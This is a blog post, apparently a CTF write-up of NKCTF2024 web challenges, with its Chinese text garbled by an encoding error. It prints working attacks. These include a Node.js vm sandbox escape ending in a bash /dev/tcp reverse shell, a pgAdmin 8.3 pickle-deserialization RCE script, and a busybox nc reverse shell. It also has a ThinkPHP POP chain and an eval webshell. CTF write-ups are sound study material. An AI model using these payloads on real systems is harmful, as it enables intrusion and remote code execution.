<html>
  <head>
    <meta charset="utf-8" />
<meta name="viewport" content="width=device-width, initial-scale=1" />
<title>NKCTF2024 WP WEB | skkyblu3</title>
<link rel="shortcut icon" href="https://skyblu3519.github.io/favicon.ico?v=1721054258675">
<link href="https://cdn.jsdelivr.net/npm/remixicon@2.3.0/fonts/remixicon.css" rel="stylesheet">
<link rel="stylesheet" href="https://skyblu3519.github.io/styles/main.css">
<link rel="alternate" type="application/atom+xml" title="NKCTF2024 WP WEB | skkyblu3 - Atom Feed" href="https://skyblu3519.github.io/atom.xml">
<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">



    <meta name="description" content="my first cms
CVE-2024-27622ï¼šhttps://github.com/capture0x/CMSMadeSimple/
åå°å¼±å£ä»¤Admin/Admin123ï¼ˆä½ ç¡®å®šè¿™æ˜¯å¼±å£ä»¤ğŸ˜¡ï¼‰ï¼Œè¿›å»æ‰“å°±è¡Œ

å…¨ä¸–ç•Œæœ€ç®€å•çš„CT..." />
    <meta name="keywords" content="ä»£ç å®¡è®¡,CTF" />
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
    <script src="//cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.5.1/build/highlight.min.js"></script>
  </head>
  <body>
    <div class="main">
      <div class="main-content">
        <div class="site-header">
  <a href="https://skyblu3519.github.io">
  <img class="avatar" src="https://skyblu3519.github.io/images/avatar.png?v=1721054258675" alt="">
  </a>
  <h1 class="site-title">
    skkyblu3
  </h1>
  <p class="site-description">
    Welcome to Internet
  </p>
  <div class="menu-container">
    
      
        <a href="/" class="menu">
          é¦–é¡µ
        </a>
      
    
      
        <a href="/archives" class="menu">
          å½’æ¡£
        </a>
      
    
      
        <a href="/tags" class="menu">
          æ ‡ç­¾
        </a>
      
    
      
        <a href="/post/about" class="menu">
          å…³äº
        </a>
      
    
  </div>
  <div class="social-container">
    
      
    
      
    
      
    
      
    
      
    
  </div>
</div>

        <div class="post-detail">
          <article class="post">
            <h2 class="post-title">
              NKCTF2024 WP WEB
            </h2>
            <div class="post-info">
              <span>
                2024-03-24
              </span>
              <span>
                7 min read
              </span>
              
                <a href="https://skyblu3519.github.io/tag/3Y4asDXPd/" class="post-tag">
                  # ä»£ç å®¡è®¡
                </a>
              
                <a href="https://skyblu3519.github.io/tag/b7GKYdjmj/" class="post-tag">
                  # CTF
                </a>
              
            </div>
            
              <img class="post-feature-image" src="https://skyblu3519.github.io/post-images/nkctf2024-wp-web.png" alt="">
            
            <div class="post-content-wrapper">
              <div class="post-content" v-pre>
                <h1 id="my-first-cms">my first cms</h1>
<p>CVE-2024-27622ï¼š<a href="https://github.com/capture0x/CMSMadeSimple/">https://github.com/capture0x/CMSMadeSimple/</a></p>
<p>åå°å¼±å£ä»¤Admin/Admin123ï¼ˆä½ ç¡®å®šè¿™æ˜¯å¼±å£ä»¤ğŸ˜¡ï¼‰ï¼Œè¿›å»æ‰“å°±è¡Œ<br>
<img src="https://skyblu3519.github.io/post-images/nkctf2024/1711285436294-8e10b8e4-d8bf-474f-bfaa-457150a6cba3.png" alt="image.png" loading="lazy"></p>
<h1 id="å…¨ä¸–ç•Œæœ€ç®€å•çš„ctf">å…¨ä¸–ç•Œæœ€ç®€å•çš„CTF</h1>
<p>Nodejsæ²™ç®±é€ƒé€¸ï¼Œsandboxä¸ºnullçš„æƒ…å†µï¼Œå‚è€ƒï¼š<a href="https://xz.aliyun.com/t/11859?time__1311=mqmx0DBD9DyDuBYD%2FQbiQQLpGDcnxArh70rD#toc-4">vmæ²™ç®±é€ƒé€¸çš„ä¸€äº›å…¶ä»–æƒ…å†µ</a></p>
<pre><code class="language-javascript">function waf(code) {
    let pattern = /(process|\[.*?\]|exec|spawn|Buffer|\\|\+|concat|eval|Function)/g;
    if(code.match(pattern)){
        throw new Error(&quot;what can I say? hacker out!!&quot;);
    }
}

app.post('/', function (req, res){
        let code = req.body.code;
        let sandbox = Object.create(null);
        let context = vm.createContext(sandbox);
        try {
            waf(code)
            let result = vm.runInContext(code, context);
            console.log(result);
        } catch (e){
            console.log(e.message);
            require('./hack');
        }
})
</code></pre>
<p><code>process</code>ã€<code>child_process</code>ä½¿ç”¨urlç¼–ç ç»•è¿‡ï¼Œ<code>execSync</code>æ–¹æ³•é€šè¿‡<code>Reflect.get</code>è·å–ã€‚ç›´æ¥åå¼¹shell</p>
<pre><code class="language-javascript">throw new Proxy({}, {
    get: function(){
        const cc = arguments.callee.caller;
        const bb = decodeURIComponent('%72%65%74%75%72%6e%20%70%72%6f%63%65%73%73');
        const cp = decodeURIComponent('%63%68%69%6c%64%5f%70%72%6f%63%65%73%73');
        const es = decodeURIComponent('%65%78%65%63%53%79%6e%63');
        const p = (cc.constructor.constructor(bb))();
        const childProcess = p.mainModule.require(cp);
        const e = Reflect.get(childProcess, es);
        return e('bash -c &quot;bash -i &gt;&amp; /dev/tcp/ip/9898 0&gt;&amp;1&quot;').toString();
    }
})
</code></pre>
<p>get flag<br>
<img src="https://skyblu3519.github.io/post-images/nkctf2024/1711285760550-2b597a2b-2f1e-477c-889e-40873cd6b14b.png" alt="image.png" loading="lazy"></p>
<h1 id="attack">attack</h1>
<p>pgAdmin8.3 RCE å‚è€ƒï¼š<a href="https://www.shielder.com/advisories/pgadmin-path-traversal_leads_to_unsafe_deserialization_and_rce/">pgAdmin (&lt;=8.3) Path Traversal in Session Handling Leads to Unsafe Deserialization and Remote Code Execution (RCE)</a></p>
<p>åŸç†æ¯”è¾ƒç®€å•ï¼Œåœ¨å¤„ç†<code>pga4_session</code>ï¼ˆæ ¼å¼ä¸º<code>&lt;sid&gt;!&lt;digest&gt;</code>ï¼‰çš„æ—¶å€™ï¼Œç¨‹åºä¼šå°†<code>sid</code>æ‰€æŒ‡çš„æ–‡ä»¶è¯»å–å¹¶ä½¿ç”¨pickleååºåˆ—åŒ–ã€‚è¿™é“é¢˜ç»™äº†ç™»å½•ç”¨æˆ·tacooooo@qq.com/tacoooooï¼ŒStorage Managerä¸Šä¼ ä¸ºä½ç½®ä¸º<code>../storage/tacooooo_qq.com/</code>ã€‚é¢˜ç›®æ²¡æœ‰bashå’Œcurlï¼Œé€šè¿‡æœ¬åœ°å¯¹æ¼æ´çš„å¤ç°çŸ¥é“äº†Storage Managerä¸Šä¼ çš„ç»å¯¹è·¯å¾„å¯èƒ½ä¸º<code>/var/lib/pgadmin/storage/tacooooo_qq.com/</code>ï¼Œé‚£å°±å¯ä»¥æŠŠå‘½ä»¤æ‰§è¡Œçš„ç»“æœå†™åˆ°è¿™ä¸ªç›®å½•ä¸‹ï¼Œç„¶åä¸‹è½½ã€‚</p>
<p>è§£é¢˜æµç¨‹å¦‚ä¸‹ï¼š</p>
<ul>
<li>ä½¿ç”¨è„šæœ¬ç”Ÿæˆ<code>skky.pkl</code></li>
</ul>
<pre><code class="language-javascript">import struct

def produce_pickle_bytes(platform, cmd):
    b = b'\x80\x04\x95'
    b += struct.pack('L', 22 + len(platform) + len(cmd))
    b += b'\x8c' + struct.pack('b', len(platform)) + platform.encode()
    b += b'\x94\x8c\x06system\x94\x93\x94'
    b += b'\x8c' + struct.pack('b', len(cmd)) + cmd.encode()
    b += b'\x94\x85\x94R\x94.'
    print(b)
    return b


cmd = &quot;ls / &gt;&gt; /var/lib/pgadmin/storage/tacooooo_qq.com/result&quot;
content = produce_pickle_bytes('posix', f&quot;{cmd}&quot;)
with open('skky.pkl', 'wb') as f:
    f.write(content)
</code></pre>
<ul>
<li>ç™»å½•ç”¨æˆ·é€‰æ‹©Tools &gt; Storage Managerä¸Šä¼ pkl</li>
</ul>
<figure data-type="image" tabindex="1"><img src="https://skyblu3519.github.io/post-images/nkctf2024/1711286776522-21a7a65f-0b57-4ec8-8509-5e5780c33bd4.png" alt="image.png" loading="lazy"></figure>
<ul>
<li>æ„é€ <code>Cookie: pga4_session=../storage/tacooooo_qq.com/skky.pkl!a</code>è®¿é—®è§¦å‘ååºåˆ—åŒ–</li>
</ul>
<figure data-type="image" tabindex="2"><img src="https://skyblu3519.github.io/post-images/nkctf2024/1711286849342-acf60a09-fc3d-4401-9a3b-deb275d17be4.png" alt="image.png" loading="lazy"></figure>
<ul>
<li>ä¸‹è½½resultæŸ¥çœ‹æ‰§è¡Œç»“æœ</li>
</ul>
<figure data-type="image" tabindex="3"><img src="https://skyblu3519.github.io/post-images/nkctf2024/1711286909606-6e387c32-477c-4f8c-89d0-941b507c1cfa.png" alt="image.png" loading="lazy"></figure>
<p>æ‰§è¡Œ<code>ls -la /bin/sh</code>å‘ç°æœ‰busybox</p>
<pre><code>lrwxrwxrwx    1 root     root            12 Jan 26 17:53 /bin/sh -&gt; /bin/busybox
</code></pre>
<p>å¯ä»¥ç”¨busyboxæä¾›çš„ncå¼¹ä¸€ä¸ªshçš„shell</p>
<pre><code>/bin/busybox nc xxxxxx 9999 -e /bin/sh
</code></pre>
<p>æœ€ååœ¨/run.shè¿›ç¨‹çš„ç¯å¢ƒå˜é‡ä¸­æ‰¾åˆ°flag <code>cat /proc/1/environ</code><br>
<img src="https://skyblu3519.github.io/post-images/nkctf2024/1711189736765-fcc768f0-ed30-4f31-aec2-40d5f6f1c742.png" alt="image.png" loading="lazy"></p>
<h1 id="ç”¨è¿‡å°±æ˜¯ç†Ÿæ‚‰">ç”¨è¿‡å°±æ˜¯ç†Ÿæ‚‰</h1>
<p>æ‰“å¼€æºç ï¼Œæ‰¾åˆ°æç¤ºæ–‡ä»¶<code>app/controller/user/think/hinthinthinthinthinthinthint.php</code>ã€‚å…¨å±€æœç´¢æ–‡ä»¶åç§°<code>hinthinthinthinthinthinthint.php</code>ï¼Œåœ¨<code>app/controller/user/think/Testone.php</code>ä¸­æœ‰å°†<code>hinthinthinthinthinthinthint.php</code>çš„<code>$content</code>å†™å…¥çš„åŠŸèƒ½</p>
<pre><code class="language-php">&lt;?php

namespace think;
header('Content-Type: text/html; charset=UTF-8');
abstract class Testone
{

    //The end of the unserialize.
    public function countTxtFiles($directory) {
        $txtFiles = glob($directory . '/*.txt');
        foreach ($txtFiles as $txtFile) {
            if (is_file($txtFile)) {
                unlink($txtFile);
            }
        }
    }


    public function __call($name, $arguments)
    {
        $a = time();
        if ($arguments[0]['time']==='10086'){
            $this-&gt;countTxtFiles(&quot;./app/controller/user/think/&quot;);
            include('./app/controller/user/think/hinthinthinthinthinthinthint.php');
            file_put_contents('./app/controller/user/think/'.md5($a),$content);
        }
    }
}
</code></pre>
<p>åŒæ—¶ï¼Œå¤„ç†ç™»å½•å¤„å­˜åœ¨ååºåˆ—åŒ–<br>
<img src="https://skyblu3519.github.io/post-images/nkctf2024/1711277351912-1d16e8a2-5cc7-4e82-b388-e2c1a9333bbd.png" alt="image.png" loading="lazy"></p>
<p>POPé“¾æ„é€ ä¸æ˜¯å¾ˆå¤æ‚ï¼Œéœ€è¦æ³¨æ„çš„å°±æ˜¯namespaceå’ŒTestoneçš„å®ç°ç±»</p>
<pre><code>windows::__destruct -&gt; removeFiles() -&gt; collection::__toString -&gt; view::__get -&gt; Debug::__call
</code></pre>
<p>POPæ„é€ å¦‚ä¸‹ï¼š</p>
<pre><code class="language-php">&lt;?php
namespace think\process\pipes;
use think\Collection;

class Windows {
    public function __construct()
    {
        $this-&gt;fileHandles = [];
        $this-&gt;files = [new Collection()];
    }
}


namespace think;
class Collection{
    public function __construct()
    {
        $this-&gt;items = new View();
    }

}

namespace think;
class View{
    public function __construct()
    {
        $this-&gt;data = array(&quot;Loginout&quot; =&gt; new Debug());
        $this-&gt;engine = array(&quot;time&quot; =&gt;&quot;10086&quot;);
    }
}

namespace think;
class Debug {
}

use think\process\pipes\Windows;
echo base64_encode(serialize(new Windows()));
// TzoyNzoidGhpbmtccHJvY2Vzc1xwaXBlc1xXaW5kb3dzIjoyOntzOjExOiJmaWxlSGFuZGxlcyI7YTowOnt9czo1OiJmaWxlcyI7YToxOntpOjA7TzoxNjoidGhpbmtcQ29sbGVjdGlvbiI6MTp7czo1OiJpdGVtcyI7TzoxMDoidGhpbmtcVmlldyI6Mjp7czo0OiJkYXRhIjthOjE6e3M6ODoiTG9naW5vdXQiO086MTE6InRoaW5rXERlYnVnIjowOnt9fXM6NjoiZW5naW5lIjthOjE6e3M6NDoidGltZSI7czo1OiIxMDA4NiI7fX19fX0=
</code></pre>
<p>ä½¿ç”¨guestç™»å½•<br>
<img src="https://skyblu3519.github.io/post-images/nkctf2024/1711282961591-50fb0980-8adb-4569-9ea7-58ca8c59e7f9.png" alt="image.png" loading="lazy"></p>
<p><code>Testone</code>å†™çš„æ–‡ä»¶åç§°ä¸º<code>md5(time())</code>ï¼Œè¿”å›çš„<code>timeNow</code>è®°å½•äº†å¤„ç†ç™»å½•çš„æ—¶é—´æˆ³ã€‚å› ä¸º<code>time()</code>è¿”å›æ—¶é—´æ˜¯ç§’çº§çš„ï¼Œè€Œè¿™ä¸¤ä¸ªæ“ä½œçš„æ—¶é—´é—´éš”ä¸åˆ°ç§’çº§ï¼Œæ‰€ä»¥å¯ä»¥ç”¨ç™»å½•çš„<code>timeNow</code>æ¥è®¡ç®—æ–‡ä»¶åç§°ã€‚</p>
<pre><code class="language-php">echo md5(&quot;1711282943&quot;);	// d1ff1f67b68695a5fb4521be6aa8cd3f
</code></pre>
<p>è®¿é—®<code>/app/controller/user/think/1711283010d1ff1f67b68695a5fb4521be6aa8cd3f</code>æ‹¿åˆ°hintï¼Œå†…å®¹å¤§è‡´å¦‚ä¸‹ï¼š</p>
<pre><code>......

&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;æˆ‘æ›¾å¬è¯´ï¼Œå¯†ç çš„æ˜æ–‡ï¼ŒåŠ ä¸Šå¿ƒçˆ±ä¹‹äººçš„åå­—(Chu0)ï¼Œå°±èƒ½å¤Ÿå¬åˆ°æ¸¸å®¢çš„å¿ƒå£°ã€‚&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;

......

POST /?user/index/loginSubmit HTTP/1.1
Host: 192.168.128.2
Content-Length: 162
Accept: application/json, text/javascript, */*; q=0.01
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Origin: http://192.168.128.2
Referer: http://192.168.128.2/
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: kodUserLanguage=zh-CN; CSRF_TOKEN=xxx
Connection: close

name=guest&amp;password=tQhWfe944VjGY7Xh5NED6ZkGisXZ6eAeeiDWVETdF-hmuV9YJQr25bphgzthFCf1hRiPQvaI&amp;rememberPassword=0&amp;salt=1&amp;CSRF_TOKEN=xxx&amp;API_ROUTE=user%2Findex%2FloginSubmit

hint: æ–°å»ºæ–‡ä»¶
</code></pre>
<p>è¿™é‡Œä¼šå‘ç°å‰æ®µæäº¤çš„ password ä¼šè¢« js ç¼–ç ä¸€æ¬¡ï¼Œè€Œåç«¯åœ¨æ ¡éªŒå‰ä¼šå¯¹å…¶è¿›è¡Œè§£ç <br>
<img src="https://skyblu3519.github.io/post-images/nkctf2024/1711283456977-72862e10-ffbd-41f4-b75b-af3b2f0457c1.png" alt="image.png" loading="lazy"></p>
<p>ç›´æ¥å¤åˆ¶è§£ç ä»£ç å¾—åˆ°æ˜æ–‡ï¼ŒåŒæ—¶æ ¹æ®æç¤ºå¾—åˆ°å¯†ç ï¼š<code>!@!@!@!@NKCTFChu0</code>ã€‚ç™»å½•guestè´¦æˆ·ï¼Œå›æ”¶ç«™ä¸­çš„<code>æ–°å»ºæ–‡ä»¶.html</code>åº”è¯¥å°±æ˜¯å‰é¢hintæ‰€æŒ‡çš„<br>
<img src="https://skyblu3519.github.io/post-images/nkctf2024/1711283736123-b9c9e25d-6330-498c-a4b1-d2fceebe9d25.png" alt="image.png" loading="lazy"></p>
<p>å…¶ä¸­ç»™å‡ºäº†shellæ–‡ä»¶<code>/data/files/shell</code></p>
<pre><code class="language-html">/var/www/html/data/files/shell

&lt;?php eval($_POST['0']); ?&gt;
</code></pre>
<p>è™½ç„¶è¿™é‡Œå¯ä»¥æ–‡ä»¶ä¸Šä¼ ï¼Œä½†æ˜¾ç„¶æ˜¯ä¼ ä¸äº†shellçš„ï¼ˆéš¾ä¸æˆè®©ä½ æŒ–0dayï¼Ÿï¼‰ã€‚ç»“åˆæç¤ºçš„å†…å®¹å¾€æ–‡ä»¶åŒ…å«çš„æ€è·¯æƒ³ã€‚å…¨å±€æœç´¢<code>include(</code>ï¼Œä¸éš¾æ‰¾åˆ°åœ¨<code>app/controller/user/think/Config.php</code>å­˜åœ¨ååºåˆ—åŒ–åˆ©ç”¨ç‚¹ï¼Œå’Œå¼€å§‹ä¸€æ ·åœ¨ä¸€ä¸ª<code>__call</code>ä¸­<br>
<img src="https://skyblu3519.github.io/post-images/nkctf2024/1711284239327-814f7493-7160-4cbd-9d61-8f7c309e9222.png" alt="image.png" loading="lazy"></p>
<p>ä¿®æ”¹ä¹‹å‰POPé“¾çš„éƒ¨åˆ†</p>
<pre><code class="language-php">namespace think;
class View{
    public function __construct()
    {
        $this-&gt;data = array(&quot;Loginout&quot; =&gt; new Config());
        $this-&gt;engine = array(&quot;name&quot; =&gt;&quot;./../../../../../../var/www/html/data/files/shell&quot;);
    }
}

namespace think;
class Config{}
</code></pre>
<p>å¼¹shell<br>
<img src="https://skyblu3519.github.io/post-images/nkctf2024/1711285079747-69f6863c-86d6-41de-a173-d9a074b8852f.png" alt="image.png" loading="lazy"></p>
<p>getflag<br>
<img src="https://skyblu3519.github.io/post-images/nkctf2024/1711285117697-cbe41945-91ea-4980-a2a5-f241479f32e9.png" alt="image.png" loading="lazy"></p>

              </div>
              <div class="toc-container">
                <ul class="markdownIt-TOC">
<li><a href="#my-first-cms">my first cms</a></li>
<li><a href="#%E5%85%A8%E4%B8%96%E7%95%8C%E6%9C%80%E7%AE%80%E5%8D%95%E7%9A%84ctf">å…¨ä¸–ç•Œæœ€ç®€å•çš„CTF</a></li>
<li><a href="#attack">attack</a></li>
<li><a href="#%E7%94%A8%E8%BF%87%E5%B0%B1%E6%98%AF%E7%86%9F%E6%82%89">ç”¨è¿‡å°±æ˜¯ç†Ÿæ‚‰</a></li>
</ul>

              </div>
            </div>
          </article>
        </div>

        
          <div class="next-post">
            <div class="next">ä¸‹ä¸€ç¯‡</div>
            <a href="https://skyblu3519.github.io/post/teng-long-bei-ctf-wp/">
              <h3 class="post-title">
                è…¾é¾™æ¯CTF WP
              </h3>
            </a>
          </div>
        

        

        <div class="site-footer">
  Powered by <a href="https://github.com/getgridea/gridea" target="_blank">Gridea</a>
  <a class="rss" href="https://skyblu3519.github.io/atom.xml" target="_blank">
    <i class="ri-rss-line"></i> RSS
  </a>
</div>

      </div>
    </div>

    <script>
      hljs.initHighlightingOnLoad()

      let mainNavLinks = document.querySelectorAll(".markdownIt-TOC a");

      // This should probably be throttled.
      // Especially because it triggers during smooth scrolling.
      // https://lodash.com/docs/4.17.10#throttle
      // You could do like...
      // window.addEventListener("scroll", () => {
      //    _.throttle(doThatStuff, 100);
      // });
      // Only not doing it here to keep this Pen dependency-free.

      window.addEventListener("scroll", event => {
        let fromTop = window.scrollY;

        mainNavLinks.forEach((link, index) => {
          let section = document.getElementById(decodeURI(link.hash).substring(1));
          let nextSection = null
          if (mainNavLinks[index + 1]) {
            nextSection = document.getElementById(decodeURI(mainNavLinks[index + 1].hash).substring(1));
          }
          if (section.offsetTop <= fromTop) {
            if (nextSection) {
              if (nextSection.offsetTop > fromTop) {
                link.classList.add("current");
              } else {
                link.classList.remove("current");    
              }
            } else {
              link.classList.add("current");
            }
          } else {
            link.classList.remove("current");
          }
        });
      });

    </script>
  </body>
</html>
